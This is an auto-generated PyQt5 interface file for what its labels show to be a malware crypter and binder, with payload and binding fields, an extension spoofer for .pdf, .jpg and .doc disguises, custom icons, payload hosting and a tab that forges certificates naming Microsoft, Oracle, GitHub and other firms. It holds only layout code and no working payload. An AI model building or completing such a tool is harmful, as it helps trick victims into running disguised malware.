# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'form.ui'
#
# Created by: PyQt5 UI code generator 5.15.11
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_Widget(object):
    def setupUi(self, Widget):
        Widget.setObjectName("Widget")
        Widget.resize(731, 769)
        Widget.setStyleSheet("QLineEdit,\n"
"QComboBox,\n"
"QDateTimeEdit,\n"
"QSpinBox,\n"
"QDoubleSpinBox {\n"
"  color: #1de9b6;\n"
"  background-color: #31363b;\n"
"  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;\n"
"}\n"
"\n"
"QWidget {\n"
"  background-color: #232629;\n"
"  color: #ffffff;\n"
"}\n"
"\n"
"QGroupBox,\n"
"QFrame {\n"
"  background-color: #232629;\n"
"  border: 2px solid #4f5b62;\n"
"  border-radius: 4px;\n"
"}\n"
"\n"
"QRadioButton::indicator,\n"
"QCheckBox::indicator {\n"
"  width: 16px;\n"
"  height: 16px;\n"
"  border: 2px solid #1de9b6;\n"
"  border-radius: 0;\n"
"  transform: rotate(45deg);\n"
"  transform-origin: center;\n"
"}\n"
"\n"
"QRadioButton::indicator:checked,\n"
"QCheckBox::indicator:checked {\n"
"  background-color: #1de9b6;\n"
"  border-color: #1de9b6;\n"
"}\n"
"\n"
"QRadioButton::indicator:hover,\n"
"QCheckBox::indicator:hover {\n"
"  border-color: rgba(29, 233, 182, 0.8);\n"
"}\n"
"\n"
"QRadioButton::indicator:checked:hover,\n"
"QCheckBox::indicator:checked:hover {\n"
"  border-color: #1de9b6;\n"
"}")
        self.payload_path_textedit = QtWidgets.QTextEdit(Widget)
        self.payload_path_textedit.setGeometry(QtCore.QRect(20, 20, 341, 21))
        self.payload_path_textedit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.payload_path_textedit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.payload_path_textedit.setObjectName("payload_path_textedit")
        self.current_stats_QFrame = QtWidgets.QFrame(Widget)
        self.current_stats_QFrame.setGeometry(QtCore.QRect(20, 80, 301, 161))
        self.current_stats_QFrame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.current_stats_QFrame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.current_stats_QFrame.setObjectName("current_stats_QFrame")
        self.current_stats_QFrame_textEdit = QtWidgets.QTextEdit(self.current_stats_QFrame)
        self.current_stats_QFrame_textEdit.setGeometry(QtCore.QRect(0, 0, 301, 161))
        self.current_stats_QFrame_textEdit.setObjectName("current_stats_QFrame_textEdit")
        self.label = QtWidgets.QLabel(Widget)
        self.label.setGeometry(QtCore.QRect(110, 60, 131, 16))
        self.label.setObjectName("label")
        self.checkBox_6 = QtWidgets.QCheckBox(Widget)
        self.checkBox_6.setGeometry(QtCore.QRect(330, 230, 78, 22))
        self.checkBox_6.setObjectName("checkBox_6")
        self.custom_icon_option_checkBox = QtWidgets.QCheckBox(Widget)
        self.custom_icon_option_checkBox.setGeometry(QtCore.QRect(330, 140, 121, 22))
        self.custom_icon_option_checkBox.setObjectName("custom_icon_option_checkBox")
        self.self_hosting_checkBox = QtWidgets.QCheckBox(Widget)
        self.self_hosting_checkBox.setGeometry(QtCore.QRect(330, 170, 121, 22))
        self.self_hosting_checkBox.setObjectName("self_hosting_checkBox")
        self.extspoof_option_checkBox = QtWidgets.QCheckBox(Widget)
        self.extspoof_option_checkBox.setGeometry(QtCore.QRect(330, 110, 131, 22))
        self.extspoof_option_checkBox.setObjectName("extspoof_option_checkBox")
        self.ev_certificate_option_checkBox = QtWidgets.QCheckBox(Widget)
        self.ev_certificate_option_checkBox.setGeometry(QtCore.QRect(330, 80, 131, 22))
        self.ev_certificate_option_checkBox.setObjectName("ev_certificate_option_checkBox")
        self.checkBox_4 = QtWidgets.QCheckBox(Widget)
        self.checkBox_4.setGeometry(QtCore.QRect(330, 200, 78, 22))
        self.checkBox_4.setObjectName("checkBox_4")
        self.payload_binding_textEdit = QtWidgets.QTextEdit(Widget)
        self.payload_binding_textEdit.setGeometry(QtCore.QRect(20, 260, 341, 21))
        self.payload_binding_textEdit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.payload_binding_textEdit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.payload_binding_textEdit.setObjectName("payload_binding_textEdit")
        self.payload_binding_pushButton = QtWidgets.QPushButton(Widget)
        self.payload_binding_pushButton.setGeometry(QtCore.QRect(370, 260, 71, 24))
        self.payload_binding_pushButton.setObjectName("payload_binding_pushButton")
        self.payload_path_pushButton = QtWidgets.QPushButton(Widget)
        self.payload_path_pushButton.setGeometry(QtCore.QRect(370, 20, 71, 24))
        self.payload_path_pushButton.setObjectName("payload_path_pushButton")
        self.features_qtabwidget = QtWidgets.QTabWidget(Widget)
        self.features_qtabwidget.setEnabled(True)
        self.features_qtabwidget.setGeometry(QtCore.QRect(10, 530, 711, 201))
        self.features_qtabwidget.setStatusTip("")
        self.features_qtabwidget.setTabShape(QtWidgets.QTabWidget.Triangular)
        self.features_qtabwidget.setObjectName("features_qtabwidget")
        self.custom_certificate_tab_settings = QtWidgets.QWidget()
        self.custom_certificate_tab_settings.setObjectName("custom_certificate_tab_settings")
        self.certificate_common_name_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.certificate_common_name_comboBox.setGeometry(QtCore.QRect(50, 10, 161, 24))
        self.certificate_common_name_comboBox.setEditable(True)
        self.certificate_common_name_comboBox.setObjectName("certificate_common_name_comboBox")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.setItemText(0, "")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_common_name_comboBox.addItem("")
        self.certificate_orginization_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.certificate_orginization_comboBox.setGeometry(QtCore.QRect(50, 40, 161, 24))
        self.certificate_orginization_comboBox.setEditable(True)
        self.certificate_orginization_comboBox.setObjectName("certificate_orginization_comboBox")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.setItemText(0, "")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_orginization_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.certificate_organizational_unit_comboBox.setGeometry(QtCore.QRect(50, 70, 161, 24))
        self.certificate_organizational_unit_comboBox.setEditable(True)
        self.certificate_organizational_unit_comboBox.setObjectName("certificate_organizational_unit_comboBox")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.setItemText(0, "")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_organizational_unit_comboBox.addItem("")
        self.certificate_locality_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.certificate_locality_comboBox.setGeometry(QtCore.QRect(260, 70, 101, 24))
        self.certificate_locality_comboBox.setEditable(True)
        self.certificate_locality_comboBox.setObjectName("certificate_locality_comboBox")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.setItemText(0, "")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.certificate_locality_comboBox.addItem("")
        self.state_certificate_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.state_certificate_comboBox.setGeometry(QtCore.QRect(260, 40, 101, 24))
        self.state_certificate_comboBox.setEditable(True)
        self.state_certificate_comboBox.setObjectName("state_certificate_comboBox")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.setItemText(0, "")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.state_certificate_comboBox.addItem("")
        self.certificate_country_comboBox = QtWidgets.QComboBox(self.custom_certificate_tab_settings)
        self.certificate_country_comboBox.setGeometry(QtCore.QRect(260, 10, 101, 24))
        self.certificate_country_comboBox.setEditable(True)
        self.certificate_country_comboBox.setObjectName("certificate_country_comboBox")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.setItemText(0, "")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_country_comboBox.addItem("")
        self.certificate_common_name_label = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.certificate_common_name_label.setGeometry(QtCore.QRect(18, 10, 31, 20))
        self.certificate_common_name_label.setObjectName("certificate_common_name_label")
        self.certificate_orginization_label = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.certificate_orginization_label.setGeometry(QtCore.QRect(20, 40, 31, 20))
        self.certificate_orginization_label.setObjectName("certificate_orginization_label")
        self.certificate_organizational_unit_label = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.certificate_organizational_unit_label.setGeometry(QtCore.QRect(20, 70, 31, 21))
        self.certificate_organizational_unit_label.setObjectName("certificate_organizational_unit_label")
        self.certificate_country_label = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.certificate_country_label.setGeometry(QtCore.QRect(230, 10, 21, 20))
        self.certificate_country_label.setObjectName("certificate_country_label")
        self.label_7 = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.label_7.setGeometry(QtCore.QRect(230, 40, 21, 20))
        self.label_7.setObjectName("label_7")
        self.label_8 = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.label_8.setGeometry(QtCore.QRect(230, 70, 21, 20))
        self.label_8.setObjectName("label_8")
        self.sign_certificate_pushButton = QtWidgets.QPushButton(self.custom_certificate_tab_settings)
        self.sign_certificate_pushButton.setGeometry(QtCore.QRect(100, 140, 181, 24))
        self.sign_certificate_pushButton.setObjectName("sign_certificate_pushButton")
        self.custom_certificate_console_textEdit = QtWidgets.QTextEdit(self.custom_certificate_tab_settings)
        self.custom_certificate_console_textEdit.setGeometry(QtCore.QRect(370, 10, 321, 151))
        self.custom_certificate_console_textEdit.setObjectName("custom_certificate_console_textEdit")
        self.dateEdit = QtWidgets.QDateEdit(self.custom_certificate_tab_settings)
        self.dateEdit.setGeometry(QtCore.QRect(70, 100, 81, 31))
        self.dateEdit.setMinimumDateTime(QtCore.QDateTime(QtCore.QDate(2024, 9, 14), QtCore.QTime(4, 0, 0)))
        self.dateEdit.setMaximumDate(QtCore.QDate(2050, 12, 31))
        self.dateEdit.setObjectName("dateEdit")
        self.dateEdit_2 = QtWidgets.QDateEdit(self.custom_certificate_tab_settings)
        self.dateEdit_2.setGeometry(QtCore.QRect(240, 100, 81, 31))
        self.dateEdit_2.setToolTipDuration(-1)
        self.dateEdit_2.setMinimumDateTime(QtCore.QDateTime(QtCore.QDate(2026, 9, 14), QtCore.QTime(0, 0, 0)))
        self.dateEdit_2.setMaximumDate(QtCore.QDate(2050, 12, 31))
        self.dateEdit_2.setMinimumDate(QtCore.QDate(2026, 9, 14))
        self.dateEdit_2.setObjectName("dateEdit_2")
        self.label_2 = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.label_2.setGeometry(QtCore.QRect(20, 100, 49, 31))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.custom_certificate_tab_settings)
        self.label_3.setGeometry(QtCore.QRect(200, 100, 41, 31))
        self.label_3.setObjectName("label_3")
        self.features_qtabwidget.addTab(self.custom_certificate_tab_settings, "")
        self.extension_spoofer_tab_settings = QtWidgets.QWidget()
        self.extension_spoofer_tab_settings.setObjectName("extension_spoofer_tab_settings")
        self.extspoof_xlxs_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_xlxs_checkBox.setGeometry(QtCore.QRect(380, 10, 61, 22))
        self.extspoof_xlxs_checkBox.setObjectName("extspoof_xlxs_checkBox")
        self.extspoof_pdf_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_pdf_checkBox.setGeometry(QtCore.QRect(380, 30, 61, 22))
        self.extspoof_pdf_checkBox.setObjectName("extspoof_pdf_checkBox")
        self.extspoof_jpg_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_jpg_checkBox.setGeometry(QtCore.QRect(380, 50, 61, 22))
        self.extspoof_jpg_checkBox.setObjectName("extspoof_jpg_checkBox")
        self.extspoof_jpeg_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_jpeg_checkBox.setGeometry(QtCore.QRect(380, 70, 61, 22))
        self.extspoof_jpeg_checkBox.setObjectName("extspoof_jpeg_checkBox")
        self.extspoof_php_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_php_checkBox.setGeometry(QtCore.QRect(380, 110, 61, 22))
        self.extspoof_php_checkBox.setObjectName("extspoof_php_checkBox")
        self.extspoof_slx_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_slx_checkBox.setGeometry(QtCore.QRect(380, 130, 61, 22))
        self.extspoof_slx_checkBox.setObjectName("extspoof_slx_checkBox")
        self.extspoof_doc_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_doc_checkBox.setGeometry(QtCore.QRect(380, 90, 61, 22))
        self.extspoof_doc_checkBox.setObjectName("extspoof_doc_checkBox")
        self.extspoof_console_frame = QtWidgets.QFrame(self.extension_spoofer_tab_settings)
        self.extspoof_console_frame.setGeometry(QtCore.QRect(440, 10, 261, 141))
        self.extspoof_console_frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.extspoof_console_frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.extspoof_console_frame.setObjectName("extspoof_console_frame")
        self.pushButton = QtWidgets.QPushButton(self.extension_spoofer_tab_settings)
        self.pushButton.setGeometry(QtCore.QRect(270, 130, 80, 24))
        self.pushButton.setObjectName("pushButton")
        self.extspoof_filepath_textEdit = QtWidgets.QTextEdit(self.extension_spoofer_tab_settings)
        self.extspoof_filepath_textEdit.setGeometry(QtCore.QRect(10, 10, 231, 21))
        self.extspoof_filepath_textEdit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.extspoof_filepath_textEdit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.extspoof_filepath_textEdit.setObjectName("extspoof_filepath_textEdit")
        self.extspoof_pif_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_pif_checkBox.setGeometry(QtCore.QRect(310, 10, 61, 22))
        self.extspoof_pif_checkBox.setObjectName("extspoof_pif_checkBox")
        self.extspoof_lnk_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_lnk_checkBox.setGeometry(QtCore.QRect(310, 30, 61, 22))
        self.extspoof_lnk_checkBox.setObjectName("extspoof_lnk_checkBox")
        self.extspoof_bat_checkBox = QtWidgets.QCheckBox(self.extension_spoofer_tab_settings)
        self.extspoof_bat_checkBox.setGeometry(QtCore.QRect(310, 50, 61, 22))
        self.extspoof_bat_checkBox.setObjectName("extspoof_bat_checkBox")
        self.features_qtabwidget.addTab(self.extension_spoofer_tab_settings, "")
        self.custom_icon_tab_settings = QtWidgets.QWidget()
        self.custom_icon_tab_settings.setObjectName("custom_icon_tab_settings")
        self.upload_icon_pushButton = QtWidgets.QPushButton(self.custom_icon_tab_settings)
        self.upload_icon_pushButton.setGeometry(QtCore.QRect(260, 20, 80, 24))
        self.upload_icon_pushButton.setObjectName("upload_icon_pushButton")
        self.icon_frame = QtWidgets.QFrame(self.custom_icon_tab_settings)
        self.icon_frame.setGeometry(QtCore.QRect(359, 10, 161, 121))
        self.icon_frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.icon_frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.icon_frame.setObjectName("icon_frame")
        self.custom_icon_textEdit = QtWidgets.QTextEdit(self.custom_icon_tab_settings)
        self.custom_icon_textEdit.setGeometry(QtCore.QRect(10, 20, 241, 21))
        self.custom_icon_textEdit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.custom_icon_textEdit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.custom_icon_textEdit.setObjectName("custom_icon_textEdit")
        self.features_qtabwidget.addTab(self.custom_icon_tab_settings, "")
        self.host_it_tab = QtWidgets.QWidget()
        self.host_it_tab.setObjectName("host_it_tab")
        self.send_to_hosting_provider_comboBox = QtWidgets.QComboBox(self.host_it_tab)
        self.send_to_hosting_provider_comboBox.setGeometry(QtCore.QRect(10, 40, 271, 24))
        self.send_to_hosting_provider_comboBox.setCurrentText("")
        self.send_to_hosting_provider_comboBox.setObjectName("send_to_hosting_provider_comboBox")
        self.frame = QtWidgets.QFrame(self.host_it_tab)
        self.frame.setGeometry(QtCore.QRect(380, 10, 311, 151))
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame.setObjectName("frame")
        self.send_to_hosting_pushButton = QtWidgets.QPushButton(self.host_it_tab)
        self.send_to_hosting_pushButton.setGeometry(QtCore.QRect(190, 130, 161, 24))
        self.send_to_hosting_pushButton.setObjectName("send_to_hosting_pushButton")
        self.send_to_hosting_file_textEdit = QtWidgets.QTextEdit(self.host_it_tab)
        self.send_to_hosting_file_textEdit.setGeometry(QtCore.QRect(10, 10, 271, 21))
        self.send_to_hosting_file_textEdit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.send_to_hosting_file_textEdit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.send_to_hosting_file_textEdit.setObjectName("send_to_hosting_file_textEdit")
        self.send_to_hosting_select_payload_pushButton = QtWidgets.QPushButton(self.host_it_tab)
        self.send_to_hosting_select_payload_pushButton.setGeometry(QtCore.QRect(290, 10, 81, 24))
        self.send_to_hosting_select_payload_pushButton.setObjectName("send_to_hosting_select_payload_pushButton")
        self.features_qtabwidget.addTab(self.host_it_tab, "")
        self.process_crypting_pushButton = QtWidgets.QPushButton(Widget)
        self.process_crypting_pushButton.setGeometry(QtCore.QRect(210, 730, 311, 31))
        self.process_crypting_pushButton.setObjectName("process_crypting_pushButton")
        self.binding_console_textEdit = QtWidgets.QTextEdit(Widget)
        self.binding_console_textEdit.setGeometry(QtCore.QRect(20, 290, 401, 221))
        self.binding_console_textEdit.setObjectName("binding_console_textEdit")
        self.settings_totality_textEdit = QtWidgets.QTextEdit(Widget)
        self.settings_totality_textEdit.setGeometry(QtCore.QRect(460, 60, 261, 471))
        self.settings_totality_textEdit.setObjectName("settings_totality_textEdit")
        self.settings_totality_label = QtWidgets.QLabel(Widget)
        self.settings_totality_label.setGeometry(QtCore.QRect(550, 40, 101, 16))
        self.settings_totality_label.setObjectName("settings_totality_label")

        self.retranslateUi(Widget)
        self.features_qtabwidget.setCurrentIndex(3)
        QtCore.QMetaObject.connectSlotsByName(Widget)

    def retranslateUi(self, Widget):
        _translate = QtCore.QCoreApplication.translate
        Widget.setWindowTitle(_translate("Widget", "Widget"))
        self.label.setText(_translate("Widget", "Current Stats Display"))
        self.checkBox_6.setText(_translate("Widget", "CheckBox"))
        self.custom_icon_option_checkBox.setText(_translate("Widget", "Custom Icon"))
        self.self_hosting_checkBox.setText(_translate("Widget", "Self Hosting"))
        self.extspoof_option_checkBox.setText(_translate("Widget", "Extension Spoofer"))
        self.ev_certificate_option_checkBox.setText(_translate("Widget", "Custom Certificate"))
        self.checkBox_4.setText(_translate("Widget", "CheckBox"))
        self.payload_binding_pushButton.setText(_translate("Widget", "Bind with"))
        self.payload_path_pushButton.setText(_translate("Widget", "Payload"))
        self.certificate_common_name_comboBox.setStatusTip(_translate("Widget", "Common Name (CN): Represents the server name protected by the SSL certificate.\\nThe certificate is valid only if the request hostname matches the certificate common name. Most web browsers display a warning message when connecting to an address that does not match the common name in the certificate."))
        self.certificate_common_name_comboBox.setWhatsThis(_translate("Widget", "Common Name (CN): Represents the server name protected by the SSL certificate.\n"
"The certificate is valid only if the request hostname matches the certificate common name. Most web browsers display a warning message when connecting to an address that does not match the common name in the certificate."))
        self.certificate_common_name_comboBox.setItemText(1, _translate("Widget", "www.oracle.com"))
        self.certificate_common_name_comboBox.setItemText(2, _translate("Widget", "www.microsoft.com"))
        self.certificate_common_name_comboBox.setItemText(3, _translate("Widget", "www.github.com"))
        self.certificate_common_name_comboBox.setItemText(4, _translate("Widget", "www.atlassian.com"))
        self.certificate_common_name_comboBox.setItemText(5, _translate("Widget", "www.zoom.us"))
        self.certificate_common_name_comboBox.setItemText(6, _translate("Widget", "slack.com"))
        self.certificate_common_name_comboBox.setItemText(7, _translate("Widget", "www.salesforce.com"))
        self.certificate_common_name_comboBox.setItemText(8, _translate("Widget", "www.adobe.com"))
        self.certificate_common_name_comboBox.setItemText(9, _translate("Widget", "www.vmware.com"))
        self.certificate_orginization_comboBox.setStatusTip(_translate("Widget", "Organization (O):"))
        self.certificate_orginization_comboBox.setWhatsThis(_translate("Widget", "Organization (O):"))
        self.certificate_orginization_comboBox.setItemText(1, _translate("Widget", "Microsoft Corporation"))
        self.certificate_orginization_comboBox.setItemText(2, _translate("Widget", "Oracle Corporation"))
        self.certificate_orginization_comboBox.setItemText(3, _translate("Widget", "Adobe Systems Incorporated"))
        self.certificate_orginization_comboBox.setItemText(4, _translate("Widget", "GitHub Certificate Authority"))
        self.certificate_orginization_comboBox.setItemText(5, _translate("Widget", "Atlassian Certificate Authority"))
        self.certificate_orginization_comboBox.setItemText(6, _translate("Widget", "Zoom Video Communications, Inc."))
        self.certificate_orginization_comboBox.setItemText(7, _translate("Widget", "Slack Technologies, Inc."))
        self.certificate_orginization_comboBox.setItemText(8, _translate("Widget", "Salesforce.com, Inc."))
        self.certificate_orginization_comboBox.setItemText(9, _translate("Widget", "VMware, Inc."))
        self.certificate_organizational_unit_comboBox.setStatusTip(_translate("Widget", "Organizational Unit (OU):"))
        self.certificate_organizational_unit_comboBox.setWhatsThis(_translate("Widget", "Organizational Unit (OU):"))
        self.certificate_organizational_unit_comboBox.setItemText(1, _translate("Widget", "Microsoft Corporation"))
        self.certificate_organizational_unit_comboBox.setItemText(2, _translate("Widget", "Oracle Global Digital Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(3, _translate("Widget", "Adobe Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(4, _translate("Widget", "GitHub Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(5, _translate("Widget", "Atlassian Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(6, _translate("Widget", "Zoom Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(7, _translate("Widget", "Slack Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(8, _translate("Widget", "Salesforce Certificate Authority"))
        self.certificate_organizational_unit_comboBox.setItemText(9, _translate("Widget", "VMware Certificate Authority"))
        self.certificate_locality_comboBox.setStatusTip(_translate("Widget", "Locality (L):"))
        self.certificate_locality_comboBox.setWhatsThis(_translate("Widget", "Locality (L):"))
        self.certificate_locality_comboBox.setItemText(1, _translate("Widget", "Redmond"))
        self.certificate_locality_comboBox.setItemText(2, _translate("Widget", "Ottawa"))
        self.certificate_locality_comboBox.setItemText(3, _translate("Widget", "Berlin"))
        self.certificate_locality_comboBox.setItemText(4, _translate("Widget", "Tokyo"))
        self.certificate_locality_comboBox.setItemText(5, _translate("Widget", "Brasília"))
        self.certificate_locality_comboBox.setItemText(6, _translate("Widget", "Canberra"))
        self.certificate_locality_comboBox.setItemText(7, _translate("Widget", "New Delhi"))
        self.certificate_locality_comboBox.setItemText(8, _translate("Widget", "Pretoria (administrative capital)"))
        self.certificate_locality_comboBox.setItemText(9, _translate("Widget", "Paris"))
        self.certificate_locality_comboBox.setItemText(10, _translate("Widget", "Mexico City"))
        self.state_certificate_comboBox.setStatusTip(_translate("Widget", "State (ST):"))
        self.state_certificate_comboBox.setWhatsThis(_translate("Widget", "State (ST):"))
        self.state_certificate_comboBox.setItemText(1, _translate("Widget", "Washington, D.C."))
        self.state_certificate_comboBox.setItemText(2, _translate("Widget", "Ottawa"))
        self.state_certificate_comboBox.setItemText(3, _translate("Widget", "Berlin"))
        self.state_certificate_comboBox.setItemText(4, _translate("Widget", "Tokyo"))
        self.state_certificate_comboBox.setItemText(5, _translate("Widget", "Brasília"))
        self.state_certificate_comboBox.setItemText(6, _translate("Widget", "Canberra"))
        self.state_certificate_comboBox.setItemText(7, _translate("Widget", "New Delhi"))
        self.state_certificate_comboBox.setItemText(8, _translate("Widget", "Pretoria"))
        self.state_certificate_comboBox.setItemText(9, _translate("Widget", "Paris"))
        self.state_certificate_comboBox.setItemText(10, _translate("Widget", "Mexico City"))
        self.certificate_country_comboBox.setStatusTip(_translate("Widget", "Country (C):"))
        self.certificate_country_comboBox.setWhatsThis(_translate("Widget", "Country (C):"))
        self.certificate_country_comboBox.setItemText(1, _translate("Widget", "US"))
        self.certificate_country_comboBox.setItemText(2, _translate("Widget", "CA"))
        self.certificate_country_comboBox.setItemText(3, _translate("Widget", "GR"))
        self.certificate_country_comboBox.setItemText(4, _translate("Widget", "JP"))
        self.certificate_country_comboBox.setItemText(5, _translate("Widget", "BR"))
        self.certificate_country_comboBox.setItemText(6, _translate("Widget", "AU"))
        self.certificate_country_comboBox.setItemText(7, _translate("Widget", "IN"))
        self.certificate_country_comboBox.setItemText(8, _translate("Widget", "SA"))
        self.certificate_country_comboBox.setItemText(9, _translate("Widget", "FR"))
        self.certificate_country_comboBox.setItemText(10, _translate("Widget", "MX"))
        self.certificate_common_name_label.setText(_translate("Widget", "CN:"))
        self.certificate_orginization_label.setText(_translate("Widget", "O:"))
        self.certificate_organizational_unit_label.setText(_translate("Widget", "OU:"))
        self.certificate_country_label.setText(_translate("Widget", "C:"))
        self.label_7.setText(_translate("Widget", "ST:"))
        self.label_8.setText(_translate("Widget", "L:"))
        self.sign_certificate_pushButton.setText(_translate("Widget", "Sign Certificate"))
        self.label_2.setText(_translate("Widget", "From:"))
        self.label_3.setText(_translate("Widget", "Till:"))
        self.features_qtabwidget.setTabText(self.features_qtabwidget.indexOf(self.custom_certificate_tab_settings), _translate("Widget", "Custom Certificate"))
        self.extspoof_xlxs_checkBox.setText(_translate("Widget", ".xlxs"))
        self.extspoof_pdf_checkBox.setText(_translate("Widget", ".pdf"))
        self.extspoof_jpg_checkBox.setText(_translate("Widget", ".jpg"))
        self.extspoof_jpeg_checkBox.setText(_translate("Widget", ".jpeg"))
        self.extspoof_php_checkBox.setText(_translate("Widget", ".php"))
        self.extspoof_slx_checkBox.setText(_translate("Widget", ".slx"))
        self.extspoof_doc_checkBox.setText(_translate("Widget", ".doc"))
        self.pushButton.setText(_translate("Widget", "Spoof It"))
        self.extspoof_pif_checkBox.setText(_translate("Widget", ".pif"))
        self.extspoof_lnk_checkBox.setText(_translate("Widget", ".lnk"))
        self.extspoof_bat_checkBox.setText(_translate("Widget", ".bat"))
        self.features_qtabwidget.setTabText(self.features_qtabwidget.indexOf(self.extension_spoofer_tab_settings), _translate("Widget", "Extension Spoofer"))
        self.upload_icon_pushButton.setText(_translate("Widget", "Upload Icon"))
        self.features_qtabwidget.setTabText(self.features_qtabwidget.indexOf(self.custom_icon_tab_settings), _translate("Widget", "Custom Icon Settings"))
        self.send_to_hosting_provider_comboBox.setPlaceholderText(_translate("Widget", "Hosting Provider of Choice"))
        self.send_to_hosting_pushButton.setText(_translate("Widget", "Send To Hoster"))
        self.send_to_hosting_select_payload_pushButton.setText(_translate("Widget", "Select Payload"))
        self.features_qtabwidget.setTabText(self.features_qtabwidget.indexOf(self.host_it_tab), _translate("Widget", "Host It"))
        self.process_crypting_pushButton.setText(_translate("Widget", "Process Crypting"))
